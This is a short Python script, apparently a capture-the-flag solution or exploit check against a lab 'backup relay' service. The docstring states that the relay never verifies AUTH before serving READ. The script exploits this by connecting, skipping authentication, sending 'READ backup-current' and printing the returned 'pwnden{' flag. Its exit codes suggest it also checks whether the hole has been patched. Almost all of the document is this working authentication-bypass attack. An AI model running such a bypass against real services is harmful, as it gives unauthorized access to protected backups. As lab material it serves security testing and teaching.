"""The relay never checks whether AUTH succeeded before serving READ; skip AUTH entirely."""
import socket
import sys

HOST, PORT = 'app', 9000


def send(sock, line):
    sock.sendall((line + '\n').encode())


def recv_line(sock):
    data = b''
    while not data.endswith(b'\n'):
        chunk = sock.recv(1)
        if not chunk:
            break
        data += chunk
    return data.decode('utf-8', 'replace').strip()


def main():
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        sock.settimeout(10)
        banner = recv_line(sock)
        if not banner.startswith('BACKUP-RELAY'):
            print('unexpected banner: ' + banner, file=sys.stderr)
            raise SystemExit(1)
        send(sock, 'READ backup-current')
        reply = recv_line(sock)
        if not reply.startswith('OK pwnden{'):
            print('AUTH is now required: ' + reply, file=sys.stderr)
            raise SystemExit(3)
        print(reply[len('OK '):])


if __name__ == '__main__':
    main()
